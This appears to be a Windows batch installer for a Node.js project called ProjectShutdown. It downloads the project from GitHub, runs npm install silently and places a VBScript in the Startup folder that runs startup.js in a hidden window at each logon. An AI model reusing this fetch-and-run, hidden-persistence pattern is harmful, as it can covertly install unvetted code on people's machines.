@echo off
setlocal

REM ==============================
REM Variables
REM ==============================
set ZIP_URL=https://github.com/Siddarth-abcs/ProjectShutdown/archive/refs/heads/main.zip

REM Programs folder
set PROGRAMS=%APPDATA%\Microsoft\Windows\Start Menu\Programs

REM Startup folder
set TARGET_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

set ZIP_NAME=ProjectShutdown.zip
set EXTRACT_FOLDER=ProjectShutdown-main
set PROJECT_DIR=%PROGRAMS%\%EXTRACT_FOLDER%

REM ==============================
REM Download ZIP
REM ==============================
echo Downloading ProjectShutdown...

powershell -Command "Invoke-WebRequest -Uri '%ZIP_URL%' -OutFile '%PROGRAMS%\%ZIP_NAME%'"

if not exist "%PROGRAMS%\%ZIP_NAME%" (
    echo Download failed.
    pause
    exit /b
)

echo Download successful.

REM ==============================
REM Extract ZIP
REM ==============================
echo Extracting ZIP...

powershell -Command "Expand-Archive -Force '%PROGRAMS%\%ZIP_NAME%' '%PROGRAMS%'"

if not exist "%PROJECT_DIR%" (
    echo Extraction failed.
    pause
    exit /b
)

echo Extraction successful.

REM ==============================
REM Verify Node.js and npm
REM ==============================
where node >nul 2>&1
if errorlevel 1 (
    echo Node.js not found.
    pause
    exit /b
)

where npm >nul 2>&1
if errorlevel 1 (
    echo npm not found.
    pause
    exit /b
)

echo Node.js and npm detected.

REM ==============================
REM Install Node Modules
REM ==============================
if not exist "%PROJECT_DIR%\package.json" (
    echo package.json not found.
    pause
    exit /b
)

echo Installing node modules...
pushd "%PROJECT_DIR%"
npm install --silent
popd

if not exist "%PROJECT_DIR%\node_modules" (
    echo Node modules installation failed.
    pause
    exit /b
)

echo Node modules installed successfully.

REM ==============================
REM Ensure Startup directory exists
REM ==============================
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%"
)

REM ==============================
REM Create start.vbs in Startup
REM ==============================
echo Creating start.vbs...

(
echo Set shell = CreateObject("WScript.Shell")
echo shell.Run "node ""%PROJECT_DIR%\startup.js""", 0, False
) > "%TARGET_DIR%\start.vbs"

if exist "%TARGET_DIR%\start.vbs" (
    echo start.vbs created successfully.
) else (
    echo Failed to create start.vbs.
)

REM ==============================
REM Run existing node.vbs
REM ==============================
set NODE_VBS_PATH=%PROJECT_DIR%\node.vbs

if exist "%NODE_VBS_PATH%" (
    echo Running node.vbs...
    cscript //nologo "%NODE_VBS_PATH%"
) else (
    echo node.vbs not found.
)

REM ==============================
REM Run start.vbs
REM ==============================
if exist "%TARGET_DIR%\start.vbs" (
    echo Running start.vbs...
    wscript "%TARGET_DIR%\start.vbs"
) else (
    echo start.vbs not found.
)

exit /b
